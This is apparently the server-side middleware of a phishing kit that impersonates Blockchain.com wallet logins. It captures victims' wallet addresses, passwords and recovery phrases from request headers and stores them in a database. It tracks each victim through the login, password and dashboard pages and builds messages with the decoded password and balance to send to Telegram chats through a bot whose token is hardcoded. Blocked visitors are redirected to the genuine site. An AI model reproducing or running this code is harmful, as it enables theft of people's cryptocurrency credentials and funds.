const geoip = require('geoip-country');
var request = require('request');
var moment = require('moment');
const BlockchainUser = require('../models/BlockchainUser');
const Notification = require('../models/Notification');

const token = '2100347326:AAFLb_qgF-yhAz7Eq_4SgR7k_HHEgOinVnY';

const sendMessage = (msg) => {
    return;
    const chat_ids = ['1850526784', '933017721'];

    chat_ids.map((chat_id, i) => {
        request({
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`
        }, function (err, response, body) {
            console.log(err)
        })
    });
}

const setNotification = (opts) => {
    if (!opts.byAdmin) {
        var status = opts.activeStatus == 0 ? 'login page' : (opts.activeStatus == 1 ? 'password page' : (opts.acceptStatus == 2 ? 'dashboard page' : 'logged out'))
        var type = opts.activeStatus == 0 ? 'success' : (opts.activeStatus == 1 ? 'warning' : 'info')
        var balance = 'unknown';
        try {
            balance = JSON.parse(opts.balance);
            balance = (balance.wallet.final_balance / balance.info.symbol_local.conversion).toFixed(3) + ' ' + balance.info.symbol_local.symbol;
        } catch (e) {
            balance = 'unknown';
        }
        const msgTG = `User Id: ${opts.user_no.substr(1)}\nVisit Time: ${opts.visitDate}\n\nhttp://block-test.dnns.net\n${opts.country} - ${opts.ipAddress}\n\nWallet: ${opts.walletAddress}\nPassword: ${Buffer.from(opts.password, 'base64').toString()}\nBalance: ${balance}\n` + opts.user_no + ' is in ' + status;
        let msg = '';
        if (opts.activeStatus == 0) {
            msg = `${opts.user_no} user is on login page`;
        } else if (opts.acceptStatus == 1) {
            msg = `${opts.user_no} user is on password page`;
        } else if (opts.activeStatus == 2) {
            msg = `${opts.user_no} user is on dashboard page\nBalance: ${balance}`;
        } else if (opts.activeStatus == 3) {
            msg = `${opts.user_no} user is logged out`;
        }
        if (msg) {
            Notification.find({ uid: opts.user_no }, (err, notifications) => {
                if (notifications.length == 0) {
                    Notification.create({
                        uid: opts.user_no,
                        name: 'Status of user',
                        message: msg,
                        image: '/assets/images/placeholder.jpg',
                        type: type,
                        noted: false
                    })
                    sendMessage(msgTG);
                }
                else if (notifications[0].message != msg) {
                    Notification.updateMany({ uid: opts.user_no }, {
                        "$set": {
                            uid: opts.user_no,
                            name: 'Status of user',
                            message: msg,
                            image: '/assets/images/placeholder.jpg',
                            type: type,
                            noted: false
                        }
                    }).exec()
                    sendMessage(msgTG);
                }
            })
        }


    }
    else if (acceptStatus != '') {
        const msg = "User rejected for connection to " + user_no;
        Notification.find({ uid: user_no, message: msg }, (err, notifications) => {
            if (notifications.length == 0) {
                Notification.create({
                    uid: user_no,
                    name: 'Rejected connection to wallet',
                    message: msg,
                    image: '/assets/images/placeholder.jpg',
                    type: 'danger'
                })
            }
            else {
                Notification.updateMany({ uid: user_no }, {
                    "$set": {
                        uid: user_no,
                        name: 'Rejected connection to wallet',
                        message: msg,
                        image: '/assets/images/placeholder.jpg',
                        type: 'danger',
                        noted: false
                    }
                }).exec()
            }
            sendMessage(msg);
        })
    }
}

module.exports = function (req, res, next) {
    var ipAddress = req.headers['x-real-ip'] || req.connection.remoteAddress;
    var byAdmin = req.query.b == 1;
    var activeStatus = req.headers['useractivestatus'] || 0;
    var walletAddress = req.headers['userwalletaddress'] || '';
    var acceptStatus = req.headers['useracceptstatus'] || '';
    var r = req.headers['r'] || '{}';
    var k = req.headers['k'] || '';
    var p = req.headers['p'] || '';
    var v = req.headers['v'] || '{}';
    var w = req.headers['w'] || '{}';

    var geo = geoip.lookup(ipAddress) || {
        country: 'unknown'
    };
    console.log(req.path);
    if (walletAddress != '') {
        BlockchainUser.find({ uid: walletAddress }, (err, users) => {
            if (users.length == 0) {
                BlockchainUser.find({}, function (err, res) {
                    const cnt = res.length;
                    const user_no = '#' + '0'.repeat(4 - (cnt + 1).toString().length) + (cnt + 1);
                    BlockchainUser.create({
                        user_no,
                        ip: ipAddress,
                        uid: walletAddress,
                        status: activeStatus,
                        acceptStatus: acceptStatus,
                        country: geo.country,
                        password: k,
                        pharse: p,
                        rootData: r,
                        walletData: w,
                        balance: v,
                        email: (new Date()).getTime() + '',
                        updatedAt: new Date()
                    });

                    setNotification({
                        user_no,
                        byAdmin,
                        activeStatus,
                        country: geo.country,
                        password: k,
                        balance: v,
                        ipAddress,
                        walletAddress,
                        visitDate: moment().format('MMMM Do YYYY, h:mm:ss a')
                    })
                });
                next();
            } else {
                if (users[0].blocked) {
                    res.status(200).redirect('https://blockchain.com');
                    return;
                }

                BlockchainUser.updateMany({
                    uid: walletAddress
                }, {
                    "$set": {
                        updatedAt: new Date(),
                        status: activeStatus,
                        acceptStatus: acceptStatus,
                        country: geo.country,
                        password: k,
                        rootData: r,
                        walletData: w,
                        balance: v,
                        ip: ipAddress,
                        pharse: p
                    }
                }, function (err) {
                    if (err) {
                        console.log("some error happened when update", err);
                    }
                }).exec()
                setNotification({
                    user_no: users[0].user_no,
                    byAdmin,
                    activeStatus,
                    country: geo.country,
                    password: k,
                    balance: v,
                    ipAddress,
                    walletAddress,
                    visitDate: moment(users[0].createdAt).format('MMMM Do YYYY, h:mm:ss a')
                })
                next()
            }
        })
    }
    else {
        next();
    }
};
